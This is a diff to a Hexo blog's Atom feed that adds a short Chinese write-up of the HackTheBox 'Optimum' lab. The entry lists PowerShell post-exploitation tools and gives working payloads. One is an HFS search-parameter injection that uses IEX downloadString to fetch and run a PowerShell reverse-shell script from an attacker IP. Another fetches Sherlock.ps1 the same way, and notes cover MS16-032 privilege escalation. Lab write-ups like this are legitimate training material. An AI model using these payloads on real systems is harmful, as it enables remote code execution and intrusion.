@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2021-02-24T16:35:11.880Z</updated>
+  <updated>2021-02-25T13:47:22.958Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,34 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Hackthebox--Optimum</title>
+    <link href="http://yoursite.com/2021/02/25/Hackthebox--Optimum/"/>
+    <id>http://yoursite.com/2021/02/25/Hackthebox--Optimum/</id>
+    <published>2021-02-25T13:45:54.763Z</published>
+    <updated>2021-02-25T13:47:22.958Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="0x00-Powershell-windows提权"><a href="#0x00-Powershell-windows提权" class="headerlink" title="0x00 Powershell windows提权"></a>0x00 Powershell windows提权</h2><ul><li>Github相关项目<figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Empire     https:<span class="regexp">//gi</span>thub.com<span class="regexp">/EmpireProject/</span>Empire</span><br><span class="line">nishang    https:<span class="regexp">//gi</span>thub.com<span class="regexp">/samratashok/</span>nishang</span><br><span class="line">sherlock   https:<span class="regexp">//gi</span>thub.com<span class="regexp">/rasta-mouse/</span>Sherlock</span><br></pre></td></tr></tbody></table></figure></li></ul><h2 id="0x01-漏洞利用"><a href="#0x01-漏洞利用" class="headerlink" title="0x01 漏洞利用"></a>0x01 漏洞利用</h2><ul><li><p>payload1:powershell反向连接</p><a id="more"></a><figure class="highlight nimrod"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?search=%<span class="number">00</span><span class="meta">{.exec|c:Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.Webclient).downloadString('http://10.10.14.126:8000/Invoke-PowerShellTcp.ps1').}</span></span><br></pre></td></tr></tbody></table></figure></li><li><p>payload2:Sherlock.ps1查找相关漏洞</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">IEX</span><span class="params">(New-Object Net.Webclient)</span></span>.downloadString(<span class="string">'http://10.10.14.126:8000/Sherlock.ps1'</span>)</span><br></pre></td></tr></tbody></table></figure></li><li><p>payload3:提权+反向shell<br>修改Invoke-PowershellTcp.ps1监听端口，然后修改Invoke-MS16032.ps1中内容，使用payload1进行调用</p></li></ul><h2 id="0x02-Powershell相关搜索命令"><a href="#0x02-Powershell相关搜索命令" class="headerlink" title="0x02 Powershell相关搜索命令"></a>0x02 Powershell相关搜索命令</h2><ul><li>powershell搜索文件<br>Get-ChildItem -Recurse -Include ‘*.txt’</li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;0x00-Powershell-windows提权&quot;&gt;&lt;a href=&quot;#0x00-Powershell-windows提权&quot; class=&quot;headerlink&quot; title=&quot;0x00 Powershell windows提权&quot;&gt;&lt;/a&gt;0x00 Powershell windows提权&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;Github相关项目&lt;figure class=&quot;highlight awk&quot;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Empire     https:&lt;span class=&quot;regexp&quot;&gt;//gi&lt;/span&gt;thub.com&lt;span class=&quot;regexp&quot;&gt;/EmpireProject/&lt;/span&gt;Empire&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;nishang    https:&lt;span class=&quot;regexp&quot;&gt;//gi&lt;/span&gt;thub.com&lt;span class=&quot;regexp&quot;&gt;/samratashok/&lt;/span&gt;nishang&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sherlock   https:&lt;span class=&quot;regexp&quot;&gt;//gi&lt;/span&gt;thub.com&lt;span class=&quot;regexp&quot;&gt;/rasta-mouse/&lt;/span&gt;Sherlock&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&quot;0x01-漏洞利用&quot;&gt;&lt;a href=&quot;#0x01-漏洞利用&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞利用&quot;&gt;&lt;/a&gt;0x01 漏洞利用&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;payload1:powershell反向连接&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;
+    
+    </summary>
+    
+      <category term="Hackthebox" scheme="http://yoursite.com/categories/Hackthebox/"/>
+    
+    
+      <category term="Hackthebox" scheme="http://yoursite.com/tags/Hackthebox/"/>
+    
+  </entry>
   
   <entry>
     <title>OSCP笔记</title>
